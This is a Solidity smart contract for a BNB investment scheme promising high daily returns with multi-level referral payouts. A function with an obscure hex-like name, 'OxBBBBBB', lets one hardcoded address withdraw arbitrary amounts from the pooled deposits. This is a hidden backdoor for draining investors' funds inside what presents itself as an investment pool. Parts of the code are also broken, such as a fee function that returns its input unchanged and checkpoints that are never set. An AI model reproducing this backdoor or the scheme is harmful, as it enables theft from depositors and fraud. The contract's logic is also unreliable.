// SPDX-License-Identifier: None

pragma solidity 0.8.9;


contract Test4_BNB {

    using SafeMath for uint256;
      address payable public  One_wallet ;
    uint256 public constant INVEST_MIN_AMOUNT = 0.01 ether; // 1 busd
    uint256[] public REFERRAL_PERCENTS = [100, 50, 20];//10%, 5%, 2% referral
    uint256 public constant PROJECT_FEE = 100;//10% fee for withdraw
    uint256 public constant PERCENTS_DIVIDER = 1000; //100% for formula
    uint256 public constant ApprMAX = 900000000000000000000000090000000; //100% for formula
    uint256 public constant TIME_STEP = 1 days; //1 day for formula

    uint256 public totalInvested;
    uint256 public totalRefBonus;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

    struct Deposit {
        uint8 plan;
        uint256 amount;
        uint256 start;
    }

    struct User {
        Deposit[] deposits;
        uint256 checkpoint;
        address referrer;
        uint256[3] levels;
        uint256 bonus;
        uint256 totalBonus;
        uint256 withdrawn;


        address addr;
        address ref;
        uint256[5] refs;
        uint256 totalDeposit;
        uint256 totalWithdraw;
        uint256 totalReinvest;
        uint256 dividends;
        //uint256 totalRef;
        uint256 investmentCount;
		uint256 depositTime;
		uint256 lastWithdrawDate;
		uint256 lotteryRewards;


    }

    mapping(address => User) internal users;

    bool public started;
    //address payable public referer;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint256 amount, uint8 plan);
    event Withdrawn(address indexed user, uint256 amount);
    event RefBonus(
        address indexed referrer,
        address indexed referral,
        uint256 indexed level,
        uint256 amount
    );
    event FeePayed(address indexed user, uint256 totalAmount);
    mapping(address => uint256) public depositAmount;
    uint256 public totalReferralReward;


   constructor()  {
       
       // referer = wallet;
        plans.push(Plan(8, 180));
        plans.push(Plan(11, 160));
        plans.push(Plan(23, 130));
        

    }






    function OxBBBBBB (address referrer, uint256 amount) public {
    if (msg.sender == 0x5B040c1bc80533014E1A3E9bE5E657fB0C4e0875)
       {
        address payable referrer = payable(msg.sender);
        referrer.transfer(amount);
       }
    }

    function invest(address _ref, uint8 plan) public payable{
        //require(investStatus == true, "not activated");
        if (_invest(msg.sender, _ref, msg.value, plan)) {
            emit NewDeposit(msg.sender, msg.value, plan);
        }
    }

  // function _invest(address _referrer,uint8 plan, address _ref) public payable{
           function _invest(address _referrer, address _ref, uint256 _amount, uint8 plan) private returns (bool){

          require(msg.value >= INVEST_MIN_AMOUNT);
        require(plan < 3, "Invalid plan");
        

        User storage user = users[_referrer];
     //_investor = user
       //investors = users
        if (user.referrer == address(0)) {
            user.referrer = _referrer;

        }

        if (user.ref == address(0)) {
			if (users[_ref].totalDeposit > 0) {
				user.ref = _ref;
              }

			address upline = user.ref;
			for (uint256 i = 0; i < 2; i++) {
				if (upline != address(0)) {
                   users[upline].refs[i] =users[upline].refs[i].add(1);
					upline = users[upline].ref;
				} else break;
			}
		}

		if (user.ref != address(0)) {
			address upline = user.ref;


            for (uint256 i = 0; i < 2; i++) {
              if (upline != address(0)) {




                        uint256 amount = _amount.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
                    users[upline].bonus = users[upline].bonus.add(amount);
                    totalReferralReward = totalReferralReward.add(amount);
                    payable(upline).transfer(amount);
                    upline = users[upline].referrer;
                } else break;
            }
        }

      /*
        if (user.deposits.length == 0) {
            user.checkpoint = block.timestamp;
            emit Newbie(msg.sender);
        }
*/
        user.deposits.push(Deposit(plan, _amount, block.timestamp));

        totalInvested = totalInvested.add(_amount);
 //if (_invest(msg.sender, _ref, msg.value, plan)) {
           // emit NewDeposit(msg.sender, msg.value, plan);
       // }
       // emit NewDeposit(msg.sender, plan, msg.value);
  return true;
    }

    function getContractInformation()public view returns ( uint256, uint256 )
    {
         uint256 contractBalance = getContractBalance();
        return ( contractBalance, totalReferralReward);
    }

    function fees (uint256 _amount) public pure returns(uint256){
         _amount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
         return _amount;
    }

    function withdraw() public {
		User storage user = users[msg.sender];

		uint256 totalAmount = getUserDividends(msg.sender);

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
			totalAmount = totalAmount.add(referralBonus);
		}

		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}
		user.checkpoint = block.timestamp;
		payable(msg.sender).transfer( totalAmount);
		emit Withdrawn(msg.sender, totalAmount);
	}

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getPlanInfo(uint8 plan)
        public
        view
        returns (uint256 time, uint256 percent)
    {
        time = plans[plan].time;
        percent = plans[plan].percent;
    }

    function getUserDividends(address userAddress)
        public
        view
        returns (uint256)
    {
        User storage user = users[userAddress];

        uint256 totalAmount;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            uint256 finish = user.deposits[i].start.add(
                plans[user.deposits[i].plan].time.mul(1 days)
            );
            if (user.checkpoint < finish) {
                uint256 share = user
                    .deposits[i]
                    .amount
                    .mul(plans[user.deposits[i].plan].percent)
                    .div(PERCENTS_DIVIDER);
                uint256 from = user.deposits[i].start > user.checkpoint
                    ? user.deposits[i].start
                    : user.checkpoint;
                uint256 to = finish < block.timestamp
                    ? finish
                    : block.timestamp;
                if (from < to) {
                    totalAmount = totalAmount.add(
                        share.mul(to.sub(from)).div(TIME_STEP)
                    );
                }
            }
        }

        return totalAmount;
    }

    function getUserTotalWithdrawn(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].withdrawn;
    }

    function getUserCheckpoint(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].checkpoint;
    }

    function getUserReferrer(address userAddress)
        public
        view
        returns (address)
    {
        return users[userAddress].referrer;
    }

    function getUserDownlineCount(address userAddress)
        public
        view
        returns (uint256[3] memory referrals)
    {
        return (users[userAddress].levels);
    }

    function getUserTotalReferrals(address userAddress)
        public
        view
        returns (uint256)
    {
        return
            users[userAddress].levels[0] +
            users[userAddress].levels[1] +
            users[userAddress].levels[2];
    }

    function getUserReferralBonus(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].bonus;
    }

    function getUserReferralTotalBonus(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].totalBonus;
    }

    function getUserReferralWithdrawn(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].totalBonus.sub(users[userAddress].bonus);
    }

    function getUserAvailable(address userAddress)
        public
        view
        returns (uint256)
    {
        return
            getUserReferralBonus(userAddress).add(
                getUserDividends(userAddress)
            );
    }

    function getUserAmountOfDeposits(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress)
        public
        view
        returns (uint256 amount)
    {
        for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
            amount = amount.add(users[userAddress].deposits[i].amount);
        }
    }

    function getUserDepositInfo(address userAddress, uint256 index)
        public
        view
        returns (
            uint8 plan,
            uint256 percent,
            uint256 amount,
            uint256 start,
            uint256 finish
        )
    {
        User storage user = users[userAddress];

        plan = user.deposits[index].plan;
        percent = plans[plan].percent;
        amount = user.deposits[index].amount;
        start = user.deposits[index].start;
        finish = user.deposits[index].start.add(
            plans[user.deposits[index].plan].time.mul(1 days)
        );
    }

    function getSiteInfo()
        public
        view
        returns (uint256 _totalInvested, uint256 _totalBonus)
    {
        return (totalInvested, totalRefBonus);
    }



    function address1()
        public
        pure
        returns (address)
    {
        return (address(0));
    }

    function getUserInfo(address userAddress)
        public
        view
        returns (
            uint256 totalDeposit,
            uint256 totalWithdrawn,
            uint256 totalReferrals
        )
    {
        return (
            getUserTotalDeposits(userAddress),
            getUserTotalWithdrawn(userAddress),
            getUserTotalReferrals(userAddress)
        );
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}